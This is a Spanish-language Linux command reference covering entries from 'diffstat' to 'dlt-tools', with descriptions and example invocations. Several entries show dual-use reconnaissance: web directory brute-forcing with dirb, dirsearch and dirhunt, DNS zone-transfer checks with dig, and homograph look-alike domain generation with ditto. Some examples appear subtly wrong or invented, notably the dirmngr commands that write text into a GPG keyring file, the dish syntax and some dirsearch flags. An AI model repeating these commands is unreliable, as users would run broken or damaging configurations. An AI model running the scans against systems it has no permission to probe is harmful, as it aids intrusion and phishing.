Produce un gráfico de barras de los cambios introducidos por el comando diff. Este programa es un filtro simple que lee la salida del programa 'diff' y produce un histograma del número total de líneas que se modificaron. Es útil para escanear un archivo de parches para ver qué archivos se modificaron.
$ diff file1.txt file2.txt | diffstat -p 1 (diff genera la salida con las diferencias y diffstat la procesa para mostrar un resumen gráfico y muestra el nombre del modificado)
$ git diff HEAD~1 HEAD | diffstat -a (compara el último commit con el anterior y muestra un gráfico de los cambios, tratando lo archivos como texto aunque no tengan la extensión)


diffutils
Utilidades de comparación de archivos. El paquete diffutils proporciona los programas diff [Compara archivos línea por línea], diff3 [Compara tres archivos línea por línea], sdiff [fusiona dos archivos de forma interactiva] y cmp [Compara archivos byte a byte].
$ diff3 archivo1.txt archivo2.txt archivo3.txt
Nota.-Los otros programas ya están comentados en sus entradas,


dig
[dnsutils]. Realizar consultas a los servidores DNS
$ dig tuxapuntes.com
$ dig telefonica.net DNS  (Mostrando los servidores DNS del dominio)
$ dig -x 74.220.215.64 (Resolución inversa)
Nota.- Los datos importantes en la “ANSWER SECTION”
$ dig +short myip.opendns.com @resolver1.opendns.com (muestra IP externa)
$ dig tuxapuntes.com somedomainname.net axfr   (mirar si un dominio es susceptible de ataques axfr)
$ dig +trace tuxapuntes.com (Ver saltos de la petición hasta el servidor)
$ dig ANY tuxapuntes.com (Consultar todos los registros de la zona DNS)


digimend
Colección de controladores de tabletas gráficas para el núcleo Linux, producida y mantenida por el proyecto DIGImend. Consultar http://digimend.github.io/drivers/digimend/tablets/ para obtener una lista de los modelos de tabletas compatibles.
$ digimend-debug status 1 (1/on/enable para habilitar, 0/off/disable para deshabilitar)


digitemp
Herramienta de software que permite leer datos de sensores de temperatura que utilizan la tecnología 1-Wire [sensor de cable]. Digitemp es un programa que lee datos provenientes de una red 1-Wire mediante un adaptador pasivo [DS9097] o el más nuevo adaptador activo [DS9097U], conectado a un puerto serial. Básicamente lee sensores de temperatura, pero también admite otros, como un sensor de humedad.
$ digitemp_DS9097U -i (buscará en la red 1-Wire y mostrará una lista de los sensores que ha encontrado, junto con sus direcciones)
$ digitemp -q -s /dev/ttyUSB0 -o 28.1234567890ab (leer temperatura de un sensor especifico. /dev/ttyUSB0 es el puerto donde está conectado el adaptador 1-Wire [ajustar según configuración])
$ digitemp -q -s /dev/ttyUSB0 > temperaturas.txt (leer la temperatura de todos los sensores conectados a la red 1-Wire y guardarlas en un archivo)
Nota.- La opción -q en los comandos anteriores significa "quiet", que suprime la salida de información que no es necesaria, mostrando solo los resultados.


digup
és una eina per actualitzar fitxers md5sum o shasum digest. Llegirà els fitxers de resum existents, comprovarà el directori actual si hi ha fitxers nous, actualitzats, modificats, canviats de nom o eliminats i consultarà a l'usuari amb un resum dels canvis. Després de revisar les actualitzacions, es poden escriure de nou al fitxer de resum.
$ digut (scanea el directorio y entra en el prompt de digup)
  Command (see help)? new (imprime los archivos modificados. Si es la primera vez que se lanza los pondrá todos)
Si al cabo de unos dias se vuelve a lanzar.
     Command (see help)? changed (mostrará los modificados)
     Command (see help)? deleted (mostrará los eliminados)
     Command (see help)? help (ver las opciones disponibles)
     Command (see help)? exit (salir)
     Command (see help)? untouched (Imprimir todos los archivos que no se han modificado)
     Command (see help)? touched (los que se han modificado con su fecha de modificación)
     Command (see help)? error (los con errores de lectura)
     Command (see help)? skipped (los omitidos durante el análisis)
     Command (see help)? save (guardar actualizaciones en sha1sum.txt y salir)


ding
Avisa con un pitido pasado determinado tiempo o a una hora especificada. descarga <https://github.com/liviu-/ding>
$ ding in 1h 15m (que avise en una hora y cuarto)
$ ding at 14:45:30 (A una hora, minuto y segundo concreto)


diodon
Administrador del portapapeles que reemplaza a clipit.


dir
listar el contenido del directorio.
$ dir -a (todo con archivos ocultos)
$ dir -A (sin archivos ocultos)
$ dir --color (con colores)
$ dir -C (por olumnas y orden alfabetico)
$ dir -c (por orden de modificación)


dir2ogg
convierte archivos MP3, M4A, WMA, FLAC... al formato de código abierto OGG.
$ dir2ogg archivo.mp3 (crea archivo.ogg sin borrar el mp3)
$ dir2ogg * (crea copias de todos los archivos del directorio compatibles a .ogg sin borrarlos)


dirb
Herramienta de fuerza bruta basada en diccionario para descubrir directorios y archivos en servidores web. Busca objetos web existentes (y/o ocultos) y básicamente, funciona lanzando un ataque basado en diccionario contra un servidor web y analizando las respuestas. DIRB viene con un conjunto de listas de palabras de ataque preconfiguradas, pero puede utilizar sus propias listas de palabras. El objetivo principal de DIRB es ayudar en la auditoría profesional de aplicaciones web, buscar vulnerabilidades en servidores y escánear contenido, no vulnerabilidades.
$ dirb http://ejemplo.com (escaneará http://ejemplo.com usando el diccionario predeterminado en /usr/share/dirb/wordlists/common.txt)
Nota.- En el directorio /usr/share/dirb/wordlists/ existen otros diccionarios disponibles: euskera.txt, catala.txt, spanish.txt... y, naturalmente, puede añadirse un txt personalizaado.
$ dirb http://ejemplo.com /usr/share/dirb/wordlists/mi_diccionario.txt
$ dirb http://ejemplo.com -X .php,.html,.txt (buscará archivos con las extensiones .php, .html y .txt)
$ dirb http://ejemplo.com -o resultados.txt (almacenará los resultados en resultados.txt)
$ dirb http://ejemplo.com -r (para desactivar escanear subdirectorios encontrados. Por defecto los scanea)
$ dirb http://ejemplo.com -p 127.0.0.1:8080 (enviar el tráfico a través de un proxy)
$ dirb http://ejemplo.com -H "User-Agent: Mozilla/5.0" -H "Cookie: PHPSESSID=12345" (agregar encabezados personalizados si el sitio requiere autenticación o cookies)


dircolors
Configuración de color para ls.
$ dircolors -b (generar el código de shell para establecer la variable LS_COLORS)
$ dircolors --print-ls-colors (mostrar colores)
$ dircolors -p > ~/.dircolors (añadir la configuración al directorio personal)
En ~/.bashrc añadir la linea:
        eval "$(dircolors ~/.dircolors)"
1.-
Para cambiar un color
$ nano ~/.dircolors
Por ejemplo cambiamos los ejecutables de 32 [verde] a 31 [rojo]:
        EXEC 01;32
Para rojo brillante:
        EXEC 01;31
$ eval "$(dircolors ~/.dircolors)" (actualizar el cambio)
2.-
Códigos básicos de color
        30 --> Negro
        31 --> Rojo
        32 --> Verde
        33 --> Amarillo
        34 --> Azul
        35 --> Magenta
        36 --> Cian
        37 --> Blanco (gris)
Códigos de fondo
        40 --> Negro
        41 --> Rojo
        42 --> Verde
        43 --> Amarillo
        44 --> Azul
        45 --> Magenta
        46 --> Cian
        47 --> Blanco
Atributos adicionales
        0 --> Reset (normal)
        1 --> Negrita
        4 --> Subrayado
        5 --> Parpadeo
        7 --> Invertir colores
        8 --> Oculto


directorylister
Un simple script en PHP creado para compartir el contenido de un directorio y sus subdirectorios via web. Descarga: <http://www.directorylister.com/> Colocar la carpeta en el directorio web.
$ cd DirectoryLister
$ mv README.md COMPYING resources
$ cd resources
$ cp default.config.php config.php
Modificar lo que proceda. Todos los archivos o carpetas que pongamos en el directorio que contiene el index.php se verá reflejado cuando accedamos a htt://localhost/DirectoryLister.


directvcn
Cliente VNC que utiliza el framebuffer como pantalla. Es un cliente que implementa el protocolo de framebuffer remoto [Remote Framebuffer Protocol - rfb] que utilizan los servidores VNC. Si un servidor VNC se está ejecutando en una máquina, puede conectarse a él mediante este cliente y ver el contenido de su pantalla en su pantalla. Los eventos del teclado y del mouse se envían al servidor, por lo que básicamente puede controlar un servidor VNC de forma remota.
$ directvnc 192.168.1.10 (conectarse a un servidor VNC en la dirección 192.168.1.10 en la pantalla predeterminada)
$ directvnc 192.168.1.10 --password su_contraseña (contraseña para autenticarse en el servidor VNC [puede ser visible en el historial de comandos])
$ directvnc 192.168.1.10 --bpp 16 (establece los bits por píxel que utilizará el cliente. Actualmente, solo se admiten 16 y 24 bpp)
$ directvnc 192.168.1.10 --encodings "tight hextile" (especifica métodos de compresión para codificar las actualizaciones de pantalla. Los métodos disponibles: copyrect, tight, hextile, zlib, corre, rre y raw)
$ directvnc 192.168.1.10 -f 100 (tiempo en milisegundos que el cliente espera entre sondeos para actualizaciones de pantalla cuando no hay eventos que procesar. Predeterminado 50 ms)
$ directvnc 192.168.1.10 -s (no desconecta a los clientes ya conectados,comportamiento predeterminado)
$ directvnc 192.168.1.10 -n (desconecta a los clientes ya conectados)
$ directvnc 192.168.1.10 --nolocalcursor (desactiva el seguimiento del cursor local)
Nota.- Actualmente, es necesario utilizar la opción --bpp para establecer la profundidad de color. Al negociar con el servidor VNC remoto, se utilizará la profundidad de color proporcionada por el servidor. Por lo tanto, es necesario asegurarse de que la profundidad de color de la pantalla, la profundidad de color proporcionada en la línea de comandos y la profundidad de color del servidor VNC remoto coincidan.


direnv
Permitir variables de entorno específicas de un proyecto sin tener que añadirlas a ~/.profile o archivos relacionados para no saturarlos y comprueba la existencia de un archivo ".envrc" en el directorio actual, si el archivo existe, se carga en un subshell y direnv captura todas las variables y las pone a disposición de la shell.
$ direnv stdlib (genera un script bash llamado stdlib que carga .envrc y el archivo ~/.config/direnv/direnvrc si existe)
$ direnc prune (elimina archivos antiguos permitidos)
$ direnv reload (recarga de entorno)
$ direnv status (imprime información de estado de depuración)
$ direnv allow (cada vez que se modifiquen .envrc y .secrets.)
$ direnv edit (muestra el contenido de .envrc)
$ direnv grant (cargar el archivo .envrc o .env)


direvent
Monitorea eventos en los directorios del sistema de archivos. Esto significa que se puede detectar cambios como la creación, modificación o eliminación de archivos y directorios en una ubicación específica, útil, por ejemplo, para rastrear cambios en archivos de configuración.
# direvent /etc (empezará a monitorear el directorio /etc y mostrará en la terminal los eventos que ocurran)
# direvent /etc/ssh/sshd_config (monitorear un archivo específico)
# direvent /etc > cambios_en_configuracion.log (redirigir la salida a un archivo)
# direvent /etc & (monitoreo en segundo plano)


direwolf
Software de módem/TNC basado en una tarjeta de sonido que permite la comunicación en modos de radioaficionados, como APRS [Automatic Packet Reporting System]. Puede funcionar como un decodificador APRS, repetidor digital, puerta de enlace APRStt o IGate [puerta de enlace a Internet].
$ direwolf -t 0  (imprimirá una configuración predeterminada en ~/.direwolf.conf, luego han de ajustarse los parámetros según las necesidades del usuario)
$ direwolf -t 0 -c ~/.direwolf.conf (recibir paquetes APRS en la frecuencia de 144,800)
Si en el archivo de configuración se ha definido, las coordenadas, la tarjeta de sonido, el indicativo de radioaficionado, etc la forma de lanzar la aplicación es siempre la misma:
$ direwolf -c ~/.direwolf.conf
Algunos parámetros del archivo de configuración son:
        DIGIPEAT=0 0 WIDE1-1 (que direwolf actúe como un repetidor digital [digi] en APRS)
        IGSERVER noam.aprs2.net (conectar direwolf a APRS-IS [el sistema de Internet de APRS] y enviar los paquetes recibidos)
        IGLOGIN CALLSIGN-SSID PASSWORD (reemplazar CALLSIGN-SSID con el indicativo y PASSWORD con la clave APRS-IS que puede generarse en sitios web de APRS)
        DTMF_THRESH 50 (permite que usuarios sin radios APRS envíen datos a la red APRS usando DTMF [tonos de teléfono])
        DTMF_PREAMBLE 1234
Nota.- Para la región 1, en la que se encuentra España, tenemos las siguientes frecuencias: 144,800 MHz [Frecuencia principal] y 432,500 MHz [Frecuencia alternativa]. Para latinoamérica. región 2, la frecuencia es 144,390 MHz.


dirhunt
Encontrar directorios en sitios web aunque el servicio no esté habilitado (<https://github.com/Nekmo/dirhunt>)
$ dirhunt http://dominio.com http://dominio2.com (escanear dos urls)
$ dirhunt http://dominio.com -e php,zip,sh (buscar determinadas extensiones. Por defecto php, zip, sh, asp, csv y log)
$ dirhunt http://dominio.com -f access_log,error_log (buscar determinados archivos)
$ dirhunt http://dominio.com --stdout-flags blank,not_found.fake,html > flags.txt (especificar flags y guardarlo en un fichero)


dirmngr
[Directory Manager]. Servicio de gestión de certificados de red que se ejecuta en segundo plano. Es un servidor para gestionar y descargar certificados OpenPGP y X.509, así como actualizaciones y señales de estado relacionadas con esos certificados. Para OpenPGP, esto significa obtenerlos de los servidores de claves públicos HKP/HKPS o de los servidores LDAP. Para X.509, esto incluye listas de revocación de certificados [CRL] y actualizaciones del protocolo de estado de certificados en línea [OCSP].
# systemctl status dirmngr (verificar si el servicio está corriendo)
$ echo "hostName = example.com" | sudo tee /etc/apt/trusted.gpg.d/example.com.gpg (configurar dirmngr para usar un servidor específico)
# apt-key update (actualizar las claves)
# gpg --keyserver hkp://pool.sks-keyservers.net:11371 --recv-keys A0D7A0C9B8D9089A (verificar una clave)
$ echo "allow-loopback-shelf = yes" | sudo tee -a /etc/dirmngr.conf (configurar dirmngr para permitir conexiones desde otro host)


dirname
Eliminar el último componente de un archivo.
$ dirname /usr/bin (Muestra sólo /usr)


dirs
Ver pushd


dirsearch
Escáner de rutas web. Este paquete contiene una herramienta diseñada para realizar búsquedas por fuerza bruta de directorios y archivos en servidores web. Como herramienta rica en funciones, dirsearch brinda a los usuarios la oportunidad de realizar una búsqueda compleja de contenido web, con muchos vectores para la lista de palabras, alta precisión, rendimiento impresionante, configuraciones avanzadas de conexión/solicitud, técnicas modernas de búsqueda por fuerza bruta y un excelente resultado.
$ dirsearch -u http://example.com (realiza una búsqueda exhaustiva de todos los directorios y archivos en el dominio especificado)
$ dirsearch -u http://example.com --wordlist /path/to/wordlist.txt (utiliza un archivo de palabras clave personalizado para enfocar la búsqueda)
$ dirsearch -u http://example.com --exclude-dir /admin/,/backup/ (excluye ciertos directorios de la búsqueda)
$ dirsearch -u http://example.com --subdomains-only (busca subdominios relacionados con el dominio principal)
$ dirsearch -u http://example.com --depth 3 (limita la profundidad de la búsqueda a 3 niveles)
$ dirsearch -u http://example.com --output-format json > results.json (guarda los resultados en un archivo JSON)


dirvish
Sistema de copia de seguridad basado en sistema de archivos que utiliza rsync. Una utilidad para mantener varias copias de seguridad en un almacenamiento en línea; cada copia de seguridad está disponible como una especie de directorio de instantáneas, donde se comparten archivos comunes entre las diferentes generaciones de copias de seguridad. Utiliza rsync para realizar la copia real. Las copias de seguridad se pueden realizar de forma local o a través de la red (utilizando ssh).
# dirvish mybackup (ejecutar un backup)
# dirvish-check mybackup ( verificar el estado de un backup)
# dirvish-restore mybackup (restaurar desde un backup)


disc-cover
Produce carátulas para CD de audio. La herramienta consulta una base de datos llamada FreeDB para obtener información sobre las pistas de un CD específico y luego crea una carátula en uno de varios formatos disponibles [PostScript, PDF, Dvi, LaTeX, texto sin formato, HTML, CDlabelgen y CDDB]. Es importante tener en cuenta que FreeDB ha sido reemplazado por otras bases de datos, como MusicBrainz.
$ disc-cover /dev/cdrom (buscará la información del CD en FreeDB y generará una carátula en el formato predeterminado)
$ disc-cover -f png /dev/cdrom (especificando el formato de salida)
$ disc-cover -o ~/mis_carátulas/caratula.png /dev/cdrom (guardar la carátula generada en un directorio específico)


discover
Sistema de identificación de hardward. Realiza detección de hardware en el momento del arranque. La información se almacena en el archivon /lib/discover/list.xml que puede visualizarse con el navegador.
$ discover


discus
Utilidad similar a df para verificar el uso de espacio en disco.
$ discus (lanzamiento básico)
$ discus -d -p 2 -m (mostrando nombres de los dispositivos, el uso de espacio con 2 dígitos y en megabytes)


dish
Ejecuta comandos simultáneamente en varios sistemas remotos a través de 'ssh', 'rsh', 'telnet', 'mysql' o cualquier cliente de conexión de línea de comandos definido por el usuario. Facilita la distribución de archivos mediante 'scp' y 'rcp', pero también el cambio de contraseñas remotas u operaciones que requieren autenticación mediante múltiples contraseñas. Dish se puede utilizar como una herramienta flexible para administrar una gran cantidad de varios tipos de hosts, como servidores (agrupados), conmutadores, bases de datos, etc.
$ dish -h servidor1,servidor2,servidor3 "ls /var/www" (ejecutará `ls /var/www` en los tres servidores especificados)
$ dish -h servidor1,servidor2,servidor3 "df -h" ssh rsh telnet (ejecutará `df -h` en los tres servidores usando SSH, RSH y Telnet respectivamente)
$ dish -h servidor1,servidor2,servidor3 "cat > archivo.txt << EOF" scp (creará archivo.txt en los tres servidores usando SCP)
$ dish -h servidor1,servidor2,servidor3 "passwd root" ssh (cambiará la contraseña de root en los tres servidores usando SSH)
$ dish -h servidor1,servidor2,servidor3 "mysql -u usario -p base_de_datos" mysql (conectará al servidor MySQL en los tres servidores, solicitando la contraseña para cada uno)


disk-filltest
Herramienta sencilla para detectar discos defectuosos llenándolos con datos aleatorios. Su propósito principal es ayudar a identificar problemas de disco mediante un proceso de escritura y lectura intensiva.
# disk-filltest /dev/sda (llenará todo el disco duro especificado con datos aleatorios y luego los leerá para verificar si hay errores)
# disk-filltest /dev/sda1 (se probará solo la primera partición del disco duro /dev/sda)
# disk-filltest /dev/sdb /dev/sdc1 /dev/sdd2 (probará todos los discos y particiones especificados)
Nota.- Los resultados se pueden ver en el archivo /var/log/syslog


diskscan
Analizar medios de almacenamiento en busca de sectores defectuosos o próximos a fallar. DiskScan tiene como objetivo encontrar sectores de un medio de almacenamiento, disco duro, unidad flash o pendrive, etc, que estén dañados o en proceso de fallar. La operación es completamente de solo lectura y no causa daños a los datos en los sistemas de archivos. Como el programa lee sectores de dispositivos de bloques, funcionará independientemente de si hay un sistema de archivos o no y no repara los sectores defectuosos, solo los detecta.
# diskscan /dev/sda (recorrerá el disco y mostrará en pantalla cualquier sector problemático)
# diskscan -t 50 /dev/sda (permite detectar sectores que aún no han fallado, pero que están funcionando más lentamente de lo normal)


disktype
Detección de formatos de disco [sistemas de archivo, particiones, volumenes, imagenes, archivos comprimidos...]
# disktype /dev/sda2
$ disktype imagen.iso
$ disktype archivo


dislocker
Diseñado para leer particiones cifradas de BitLocker en un sistema Linux. El controlador se utiliza para leer volúmenes cifrados en versiones de sistemas Windows y particiones cifradas USB/FAT32.
# dislocker /dev/sdb1 /mnt/bitlocker (montar la partición BitLocker /dev/sdb1 en el directorio /mnt/bitlocker)
# lsblk (verificar si el volumen se montó correctamente)
# mount /dev/mapper/dislocker-uuid /mnt/cifrado (después de ejecutar dislocker, se puede montar el volumen cifrado de forma normal. "dislocker-uuid" es el UUID generado por dislocker para el volumen cifrado)
# cd /mnt/cifrado (acceder al contenido del volumen cifrado)
# umount /mnt/cifrado (desmontar el volumen cifrado)
Nota.- La partición debe estar cifrada por BitLocker y no necesariamente tiene que ser una partición completa, puede ser una partición parcial y Dislocker solo funciona con particiones cifradas por BitLocker, no con otras formas de cifrado como LUKS o GPT.


disorderfs
Sistema de archivos basado en FUSE que se usa para introducir no determinismo en los metadatos del sistema de archivos. "no determinismo" significa que una misma acción puede producir resultados diferentes en distintos momentos. En el contexto de los sistemas de archivos, esto implica que disorderfs puede alterar el orden en que se devuelven los archivos y modificar sus tiempos de acceso/modificación/creación, lo cual es útil para probar software y detectar dependencias ocultas en el orden de los archivos.
1.-
Montar un directorio con disorderfs
Supongamos que tenemos un directorio /home/user/proyecto y queremos montarlo con disorderfs en /mnt/disorderfs:
# mkdir /mnt/disorderfs
# disorderfs --shuffle /home/user/proyecto /mnt/disorderfs (reordena los archivos de forma aleatoria cada vez que se acceden)
$ ls /mnt/disorderfs (si listamos los archivos en /mnt/disorderfs, el orden cambiará en cada ejecución del listado)
2.-
Cambiar aleatoriamente las marcas de tiempo de los archivos
Si queremos que las fechas de creación/modificación de los archivos sean aleatorias, usamos:
# disorderfs --shuffle --touch-randomize /home/user/proyecto /mnt/disorderfs (modifica las fechas de acceso, modificación y creación con valores aleatorios)
$ ls -l --time-style=full-iso /mnt/disorderfs (inspeccionamos las marcas de tiempo y veremos que cambian)
3.-
Probar si un paquete es reproducible
Si estamos verificando la reproducibilidad de un paquete de software, podemos compilarlo dentro del directorio montado con disorderfs:
# disorderfs --shuffle --multi-user . /mnt/build (simula un sistema multiusuario, útil para verificar permisos)
# cd /mnt/build
# make (compila el código dentro del sistema de archivos no determinista)
Si la compilación produce archivos diferentes en distintas ejecuciones, significa que el proceso no es completamente reproducible.
# umount /mnt/disorderfs (desmontar el sistema de archivos)


disown
Disociar un proceso de la terminal que lo lanzó. Cuando creamos un proceso desde una terminal, éste queda ligado a la terminal. Si se cierra la terminal, también se cierra el proceso. disown evita tal contingencia. Veamos el proceso:
Si se lanza:
$ yes > /dev/null
Cerramos y volvemos a abrir la terminal y ejecutamos:
$ ps aux | grep yes | grep -v grep
Veremos que el proceso no existe. Si volvemos a lanzar "yes":
$ yes > /dev/null
Pulsamos Ctrl+z:
[1]+  Detenido                  yes > /dev/null
Lanzando:
$ jobs
Nos mostrará la misma salida. Ahora en el promt escribimos:
$ disown -h %1
Con lo que desligamos el proceso de la terminal. Hemos liberado la terminal pero si la cerramos, aún matamos el proceso "yes". Para que esto no ocurra, lo mandamos a segundo plano con bg y número de proceso [1]:
$ bg 1
[1]+ yes > /dev/null &
Ahora podemos cerrar la terminal sin que el proceso "yes" se vea afectado. El proceso se simplifica si ya lanzamos el comando en background:
$ yes > /dev/null &
[1] 13248
Lo disociamos de la terminal:
$ disown -h %1
Y ya podemos cerrar la terminal sin afectar al proceso.
Otras opciones:
$ disown -a (Desliga todos los procesos ejecutados desde la terminal)
$ disown -r (Desliga los que esten en marcha [running])


display
[imagemagick]. Visualizar imagenes en las X.
$ display imagen.jpg
$ DISPLAY=:0.0 gedit  (lanzado desde una tty, abre gedit en las X. Si solo tenemos una sesión X corriendo, puede suprimirse el “.0”)
$ gxmessage “Cierra el firefox” -display :0 (Lanzado desde una tty mostrará el mensaje en las X)


display-dhammapada
Colección de dichos budistas de estilo fortune. Este programa muestra un verso aleatorio de las traducciones al inglés o al polaco del Dhammapada, una "escritura budista versificada que tradicionalmente se atribuye al propio Buda"
$ dhamma


distributed-net
Permitir que los ciclos de CPU no utilizados en tu computadora sean donados a distributed.net para proyectos de aplicaciones practicas en la ciencia, de investigación académica y de interés público.
# /etc/init.d/distributed-net status
$ dnetc -config (se entra en el prompt de la aplicaciones con los datos a completar y la información de los proyectos actuales)
$ dnetc (iniciar el cliente y empezar a procesar paquetes de datos)
$ dnetc -quiet (ejecutarlo en segundo plano)
$ dnetc -test (pruebas de errores de núcleo)
$ dnetc -update (forzar una actualización manual de los paquetes de datos)
$ dnetc -priority 5 (limitar el uso de CPU. Valores válidos: 0 - máxima prioridad, 9 - mínima prioridad)
$ dnetc -background (ejecutarlo como servicio en segundo plano)
$ dnetc -shutdown (detenerlo)


distribution-gpg-keys
Recopilación de claves GPG para comprobar las firmas de los paquetes rpm de las siguientes distribuciones basadas en RPM: Anolis OS, Amazon Linux, Alma Linux, Azure Linux/CBL-Mariner, CentOS, Circle Linux, EPEL, EuroLinux, Fedora, Mageia, openEuler, OpenMandriva, openSUSE, Oracle Linux, Qubes, Rocky Linux, RosaLinux, RPM Fusion, Red Hat, Navy Linux, Scientific Linux y United RPMs. Listado completo en file:///usr/share/distribution-gpg-keys


distro-info
Información sobre las versiones de Debian.
$ distro-info --all (muestra todas las que se han publicado)
$ distro-info --stable (la stable actual)
$ distro-info --testing (la testing actual)


distrobox
Herramienta para entornos de línea de comandos en contenedores en Linux. Distrobox utiliza podman o docker para crear contenedores utilizando cualquier distribución Linux. El contenedor creado se integrará estrechamente con el host, lo que permitirá compartir el directorio HOME del usuario, el almacenamiento externo, los dispositivos USB externos, las aplicaciones gráficas y el audio. Consta de los sigientes ejecutables: distrobox-create, distrobox-enter, distrobox-ephemeral, distrobox-export, distrobox-generate-entry, distrobox-host-exec, distrobox-init, distrobox-list, distrobox-rm, distrobox-stop y distrobox-upgrade
$ distrobox-create --name mi-contenedor --image ubuntu:latest (crea un contenedor llamado "mi-contenedor" utilizando la imagen de Ubuntu más reciente)
$ distrobox-enter mi-contenedor (entrar en el contenedor "mi-contenedor". Desde allí, puedes ejecutar comandos de Ubuntu, instalar software, etc)
$ distrobox-ephemeral --image fedora:latest (crea un contenedor temporal basado en Fedora. Una vez que salgas del contenedor, se eliminará)
$ distrobox-list (mostrará todos los contenedores existentes, sus nombres y sus estados)
$ distrobox-remove mi-contenedor (elimina el contenedor "mi-contenedor")


ditaa
Transforma caracteres ascii en mapas de bips.
$ nano grafic.txt
	+--------+   +-------+    +-------+      /-------\
	| c1FF   | --+ text  +--> | cBLK  |      | Text  |
	|  Text  |   +-------+    | Text  | ---> |       |
	|        |   | Text  |    |   +---+      |  cBLU |
	|     {d}|   | cGRE  |    |   | B |      \-------/
	+---+----+   +-------+    +---+---+
	    :              +----+    ^  |
	    |       text   |cRED|    |  |
	    +--------------+----+----+  |
	                   |cC02|       +-----------+
	                   +----+     +-+---+       |
	                              |c1AB |       |
	                              |text |<------+
	                              +-----+
$ ditaa grafic.txt grafic.png


ditto
Herramienta para generar variantes con caracteres parecidos [homógrafos] de un dominio. Puede causar un baneo temporal de los servidores de WHOIS.
$ ditto -string palabra (sobre una palabra)
$ ditto -domain nombre.com (sobre un dominio)
$ ditto -domain nombre.com -available (que muestre solo los disponibles)
$ ditto -domain facebook.com -registered (mostrar solo los registrables)


divxcomp
Ayudar a calcular la tasa de bits adecuada para codificar videos en formato DivX teniendo en cuenta el tamaño, el sonido y la duración con herramientas como ffmpeg o mencoder.
$ divxcomp 716800 120 128 (para que archivo final tenga un tamaño aproximado de 700 MB [700 MB = 700 * 1024 KB = 716800 KB], con una duración de 120 minutos y una tasa de bits de audio de 128 kbps.)
$ divxcomp 1048576 90 192 (para un video que dura 90 minutos y se quiere que el archivo final sea de 1 GB [1 GB = 1 * 1024 * 1024 KB = 1048576 KB], con una tasa de audio de 192 kbps)


dizzy
Demostración de gráficos que rota planos de patrones sobre un fondo de color. También permite que se ejecute como protector de pantalla.
$ dizzy -f -a 3 (a pantalla completa y 3 segundos de dureción cada frame)
Nota.- Con las flechas se modifican los patrones y con "q" se sale


djvm
Manipular documentos .djvu
$ djvm -l fichero.djvm (Lista el contenido)
$ djvm -c archivo.djvu file1.djvu file2.djvu (Crea un archivo juntando varios archivos djvu)
$ djvm -d archivo.djvu 0022 (Eliminar la página 22 del archivo.djvu)


djvudump
Mostrar la estructura interna de los archivos DjVu.
$ djvudump archivo.djvu


djvusmooth
Visor y manipulador gráfico de documentos djvu.
$ djvusmooth archivo.djvu


dkms
[Dynamic Kernel Module System]. Marco diseñado para permitir que los módulos de kernel individuales se actualicen sin cambiar el kernel completo lo cual evita módulos obsoletos después de una actualización del núcleo y errores al cargar módulos debido a incompatibilidades con la nueva versión del núcleo.
# dkms status (verificar el estado de los módulos)
# dkms remove modulo/0.xx-xx-generic --all (eliminar un módulo)
1.-
Instalar un módulo personalizado usando DKMS:
$ wget https://example.com/modulo.tar.gz (descargar el módulo)
$ tar xvf modulo.tar.gz (descomprimir el módulo)
$ cd modulo
# dkms add ./ (configurar)
# dkms build . (compilar el módulo)
# dkms install ./ (instalar)


dl10n
El comando y sus subcomandos forman parte de las herramientas de localización y traducción en Debian. Estas herramientas ayudan a verificar y generar informes sobre el estado de las traducciones en el proyecto Debian y  consta de las siguientes herramientas: dl10n-check [busca en los paquetes fuente cosas para traducir], dl10n-txt [genera vistas de estadísticas textuales], dl10n-html [genera las páginas web de Debian], dl10n-mail [Busca correos cuyo título siga un formato específico], dl10n-nmu, dl10n-pts y dl10n-spider [analiza los archivos de la lista de correo debian-l10n-<idioma>]
$ dl10n-check es.po (verifica el archivo es.po y muestra advertencias o errores y la consistencia y calidad de la traduccion)
$ dl10n-check *.po (revisa todos los archivos .po en el directorio actual)
$ dl10n-txt --lang=es > informe.txt (genera un informe de traducciones para el idioma español (es) y lo guarda en informe.txt)
$ dl10n-html --lang=fr --output=estado.html (crea un informe en HTML para las traducciones al francés (fr) y lo guarda como estado.html)
$ dl10n-spellcheck es.po (busca errores ortográficos en el archivo es.po)


dlint
Analiza cualquier zona DNS que se especifique e informa de cualquier problema que encuentre mostrando errores y advertencias.
# dlint lapipaplena.org


dlocate
Alternativa rápida a dpkg -L y dpkg -S. Usa una base de datos de dpkg, similar a locate, para buscar archivos de manera más eficiente, mostrando todos los archivos instalados por un paquete, verificando sumas MD5, entre otras funcionalidades. Consta de la siguientes herramientas: dpkg-hold, dpkg-purge, dpkg-remove, dpkg-unhold y update-dlocatedb
$ dlocate -l bash (muestra todos los archivos instalados por el paquete bash)
$ dlocate /bin/bash (muestra el paquete que contiene /bin/bash)
$ dlocate -S coreutils (enumera todos los registros que coincidan con coreutils)
$ dlocate -man bash (muestra todas las páginas de manual incluidas en el paquete)
$ dlocate -md5sum openssh-server (ver las sumas MD5SUM de los archivos instalados por un paquete)
$ dlocate -K (lista de kernels instalados y paquetes relacionados)
$ dlocate -l python3 | grep bin (muestra solo los archivos que contienen bin en el nombre o ruta)


dlt-daemon
Daemon de registro de diagnóstico y seguimiento. Es el proceso principal que se encarga de recopilar mensajes de registro y traza de varias fuentes basada en el protocolo estandarizado especificado en el estándar AUTOSAR 4.0 DLT. Puede escuchar mensajes a través de adaptadores como stdin, UDP, o módulos personalizados. Este software puede ser utilizado por los componentes de COVESA y otras aplicaciones como una herramienta de registro. El daemon DLT es el componente central de COVESA, que recopila todos los registros y seguimientos de las aplicaciones de usuario de DLT.
# dlt-daemon -c /etc/dlt.conf (inicia el demonio DLT que comienza a escuchar y registrar mensajes de diagnóstico)


dlt-tools
[Diagnostic Log and Trace]. Está diseñado para registrar y rastrear información de diagnóstico en sistemas embebidos, como los que se encuentran en la industria automotriz. Este protocolo permite la comunicación entre diferentes módulos del sistema y herramientas externas para el monitoreo y depuración. Este paquete incluye herramientas para conectarse y experimentar con el demonio DLT: dlt-adaptor-stdin, dlt-adaptor-udp, dlt-control, dlt-convert, dlt-dbus, dlt-kpi, dlt-logstorage-ctrl, dlt-passive-node-ctrl, dlt-receive, dlt-sortbytimestamp y dlt-system
# echo "Mensaje de prueba desde stdin" | dlt-adaptor-stdin (el mensaje se envía al dlt-daemon, que lo procesa y lo registra)
# dlt-adaptor-udp -p 3490 (los mensajes enviados al puerto UDP 3490 se recibirán y registrarán)
# dlt-control -l DEBUG (cambiar el nivel de registro)
# dlt-logstorage-ctl -s start (inicia el almacenamiento de registros en el archivo configurado)
# dlt-receive -a 127.0.0.1 (escucha mensajes del dlt-daemon en la dirección local)


dm-writeboost-dkms
